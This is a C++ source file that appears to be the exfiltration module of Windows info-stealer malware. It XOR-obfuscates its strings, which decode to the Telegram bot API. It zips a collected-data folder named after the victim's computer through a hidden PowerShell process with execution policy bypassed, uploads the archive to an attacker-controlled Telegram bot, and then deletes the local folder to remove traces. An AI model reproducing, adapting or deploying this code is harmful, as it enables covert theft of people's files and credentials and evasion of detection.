#include "telegram_utils.hpp"
#include "telegram_config.hpp"
#include <fstream>
#include <sstream>
#include <ctime>
#include <iomanip>
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#pragma comment(lib, "winhttp.lib")
namespace Core {
static std::string DecodeStr(const char* encoded, size_t len) {
    std::string result;
    result.reserve(len);
    for (size_t i = 0; i < len; ++i) {
        result += encoded[i] ^ 0xAA;
    }
    return result;
}
static const char ENC_HOST[] = {
    0xcb, 0xda, 0xc3, 0x84, 0xde, 0xcf, 0xc6, 0xcf, 0xcd, 0xd8, 0xcb, 0xc7, 
    0x84, 0xc5, 0xd8, 0xcd, 0x00
};
static const char ENC_PATH[] = {
    0x85, 0xc8, 0xc5, 0xde, 0x00
};
static const char ENC_DOC[] = {
    0x85, 0xd9, 0xcf, 0xc4, 0xce, 0xee, 0xc5, 0xc9, 0xdf, 0xc7, 0xcf, 0xc4, 
    0xde, 0x00
};
std::string GenerateBoundary() {
    std::ostringstream oss;
    oss << std::hex << GetTickCount() << GetCurrentProcessId();
    return oss.str();
}
std::vector<char> ReadFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(size);
    if (file.read(buffer.data(), size)) {
        return buffer;
    }
    return {};
}
std::string GetFileName(const std::string& filePath) {
    size_t pos = filePath.find_last_of("\\/");
    if (pos != std::string::npos) {
        return filePath.substr(pos + 1);
    }
    return filePath;
}
void UploadData(const std::string& filePath) {
    auto fileContent = ReadFileContent(filePath);
    if (fileContent.empty()) return;
    std::string fileName = GetFileName(filePath);
    std::string boundary = GenerateBoundary();
    std::ostringstream body;
    body << "--" << boundary << "\r\n";
    body << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body << DecodeStr(TELEGRAM_CHANNEL_ID_ENC, TELEGRAM_CHANNEL_ID_LEN) << "\r\n";
    body << "--" << boundary << "\r\n";
    body << "Content-Disposition: form-data; name=\"document\"; filename=\"" << fileName << "\"\r\n";
    body << "Content-Type: application/zip\r\n\r\n";
    std::string bodyStr = body.str();
    std::vector<char> requestBody;
    requestBody.insert(requestBody.end(), bodyStr.begin(), bodyStr.end());
    requestBody.insert(requestBody.end(), fileContent.begin(), fileContent.end());
    std::string footer = "\r\n--" + boundary + "--\r\n";
    requestBody.insert(requestBody.end(), footer.begin(), footer.end());
    std::string token = DecodeStr(TELEGRAM_BOT_TOKEN_ENC, TELEGRAM_BOT_TOKEN_LEN);
    std::string path = DecodeStr(ENC_PATH, sizeof(ENC_PATH) - 1) + token + DecodeStr(ENC_DOC, sizeof(ENC_DOC) - 1);
    std::wstring wPath(path.begin(), path.end());
    std::string host = DecodeStr(ENC_HOST, sizeof(ENC_HOST) - 1);
    std::wstring wHost(host.begin(), host.end());
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(),
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wContentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSendRequest(hRequest,
                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                      requestBody.data(), static_cast<DWORD>(requestBody.size()),
                      static_cast<DWORD>(requestBody.size()), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
std::string CreateArchive(const std::filesystem::path& outputDir) {
    if (!std::filesystem::exists(outputDir)) {
        return "";
    }
    auto now = std::time(nullptr);
    std::tm tm;
    localtime_s(&tm, &now);
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    std::ostringstream zipName;
    zipName << "data_" << computerName << "_"
            << std::put_time(&tm, "%Y%m%d_%H%M%S") << ".zip";
    std::filesystem::path zipPath = std::filesystem::current_path() / zipName.str();
    std::ostringstream cmd;
    cmd << "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Compress-Archive -Path '"
        << outputDir.string() << "\\*' -DestinationPath '"
        << zipPath.string() << "' -Force\"";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::string cmdStr = cmd.str();
    if (CreateProcessA(NULL, const_cast<char*>(cmdStr.c_str()), NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // Attendre que le processus se termine
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    if (std::filesystem::exists(zipPath)) {
        return zipPath.string();
    }
    return "";
}
void RemoveDirectory(const std::filesystem::path& outputDir) {
    if (!std::filesystem::exists(outputDir)) {
        return;
    }
    try {
        std::filesystem::remove_all(outputDir);
    } catch (...) {
    }
}
}